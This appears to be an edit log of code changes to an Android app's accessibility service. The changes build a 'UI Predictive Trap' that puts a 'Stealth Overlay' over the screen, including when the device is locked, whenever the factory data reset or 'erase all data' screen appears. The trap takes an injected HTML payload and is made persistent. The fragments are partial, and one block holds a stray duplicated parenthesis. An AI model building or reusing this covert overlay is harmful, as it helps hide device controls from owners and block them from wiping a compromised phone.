ops.text: Add DIM_LEVEL parameter to UI_TRAP dashboard UI and update command concatenation logic.

ops.find_block: { id: 'UI_TRAP', name: 'UI Predictive Trap', icon: '🪤', inputs: [{id: 'ui-trap-target', label: 'Target Fingerprint (Title@@Summary)', type: 'text', placeholder: 'Factory data reset@@erase all data'}, {id: 'ui-trap-method', label: 'Layer', type: 'select', options: [{v: 'ACC', l: 'ACC (Stealth Overlay)'}, {v: 'OVERLAY', l: 'Standard Overlay'}]}, {id: 'ui-trap-timeout', label: 'Failsafe Timeout (s)', type: 'number', val: 15}, {id: 'ui-trap-html', label: 'Predictive HTML Payload', type: 'textarea', placeholder: '<html onload="Cortex.setDim(0)">...'}] },

ops.text: Constraint UI Trap to area between status and navigation bars.

ops.find_block:
val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    targetType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or 
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    PixelFormat.TRANSLUCENT
                )
ops.replace_with:
val resources = ctx.resources
                val statusBarId = resources.getIdentifier("status_bar_height", "dimen", "android")
                val navBarId = resources.getIdentifier("navigation_bar_height", "dimen", "android")
                val sHeight = if (statusBarId > 0) resources.getDimensionPixelSize(statusBarId) else 0
                val nHeight = if (navBarId > 0) resources.getDimensionPixelSize(navBarId) else 0
                
                val displayMetrics = resources.displayMetrics
                val totalHeight = displayMetrics.heightPixels
                val availableHeight = totalHeight - sHeight - nHeight

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    availableHeight,
                    0, // x
                    sHeight, // y offset (start below status bar)
                    targetType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or 
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                    PixelFormat.TRANSLUCENT
                )
                params.gravity = android.view.Gravity.TOP

ops.find_block:
var flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED

            if (!touchable) {
                flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            }

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                targetType,
                flags,
                PixelFormat.TRANSLUCENT
            )

            )
            params.gravity = android.view.Gravity.TOP

ops.text: Convert UI_TRAP to a persistent Vision Engine that toggles based on target visibility.
Refactor UI_TRAP in MyAccessibilityService to be persistent with a 2000ms cooldown, matching POWER_SHIELD logic.
Refactor DynamicUIManager to support safe area insets and restrict UI_TRAP to between system bars.
Refactor UI_TRAP to use DimmerManager strictly as a 600ms transition mask, eliminating flicker and restoring navigation bars.
